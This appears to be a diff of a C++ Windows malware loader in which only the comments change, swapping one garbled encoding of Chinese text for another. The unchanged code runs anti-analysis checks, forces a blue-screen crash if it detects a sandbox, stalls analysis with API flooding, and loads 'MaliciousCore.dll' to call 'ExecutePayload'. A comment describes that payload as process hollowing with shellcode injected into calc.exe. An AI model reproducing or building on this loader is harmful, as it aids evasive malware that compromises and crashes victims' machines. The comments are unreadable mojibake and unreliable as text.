@@ -1,43 +1,43 @@
 #include <Windows.h>
 #include "IntegratedAntiAnalysis.h"
-#include "AntiSandbox.h"      // ä»…ç”¨äº APIFlooding_Delay
+#include "AntiSandbox.h"      // ½öÓÃÓÚ APIFlooding_Delay
 #include "BSODTrigger.h"
 
 typedef BOOL(*ExecFunc)();
 
 int main() {
-    // åˆ›å»ºç»¼åˆååˆ†æå¼•æ“
+    // ´´½¨×ÛºÏ·´·ÖÎöÒıÇæ
     IntegratedAntiAnalysis engine;
 
-    // å¤šçº¿ç¨‹ç¯å¢ƒè¯„ä¼°ï¼Œé˜ˆå€¼3åˆ†ï¼Œè¶…æ—¶10ç§’
+    // ¶àÏß³Ì»·¾³ÆÀ¹À£¬ãĞÖµ3·Ö£¬³¬Ê±10Ãë
     if (!engine.Evaluate(10000, 3)) {
-        // ç¯å¢ƒä¸å®‰å…¨ï¼Œé€€å‡º
+        // »·¾³²»°²È«£¬ÍË³ö
         BSODTrigger bsod;
         bsod.TriggerBSOD();
         return 1;
     }
 
-    // é€šè¿‡æ£€æµ‹åï¼Œå¯ç»§ç»­æ‰§è¡Œå¹²æ‰°æ“ä½œ
+    // Í¨¹ı¼ì²âºó£¬¿É¼ÌĞøÖ´ĞĞ¸ÉÈÅ²Ù×÷
     AntiSandbox::APIFlooding_Delay();
-    // ä½¿ç”¨å®Œæ•´è·¯å¾„åŠ è½½ DLL
+    // Ê¹ÓÃÍêÕûÂ·¾¶¼ÓÔØ DLL
     HMODULE hDll = LoadLibraryA("C:\\test\\MaliciousCore.dll");
     if (!hDll)
     {
-        // åŠ è½½å¤±è´¥ï¼Œé”™è¯¯ç 
+        // ¼ÓÔØÊ§°Ü£¬´íÎóÂë
         DWORD err = GetLastError();
         return 1;
     }
 
-    // è·å–å‡½æ•°åœ°å€
+    // »ñÈ¡º¯ÊıµØÖ·
     ExecFunc exec = (ExecFunc)GetProcAddress(hDll, "ExecutePayload");
     if (!exec)
     {
         return 2;
     }
 
-    // æ‰§è¡Œæ¶æ„ä»£ç ï¼ˆè¿›ç¨‹é•‚ç©º + æ³¨å…¥ shellcodeï¼‰
+    // Ö´ĞĞ¶ñÒâ´úÂë£¨½ø³ÌïÎ¿Õ + ×¢Èë shellcode£©
     exec();
 
-    // æ³¨æ„ï¼šexec è¿”å›åï¼Œæ³¨å…¥å·²å®Œæˆï¼Œshellcode å·²åœ¨ calc.exe ä¸­è¿è¡Œ
+    // ×¢Òâ£ºexec ·µ»Øºó£¬×¢ÈëÒÑÍê³É£¬shellcode ÒÑÔÚ calc.exe ÖĞÔËĞĞ
     return 0;
 }
